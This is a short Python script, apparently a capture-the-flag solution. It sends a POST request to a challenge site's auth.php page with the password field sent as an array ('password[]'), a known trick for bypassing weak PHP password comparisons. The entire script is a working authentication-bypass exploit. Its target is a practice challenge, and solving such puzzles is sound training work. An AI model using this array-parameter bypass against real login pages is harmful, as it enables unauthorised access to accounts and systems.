import requests

url = 'http://ctfq.sweetduet.info:10080/~q32/auth.php'

r = requests.post(url, data={ 'password[]': 'a'})

print(r.text)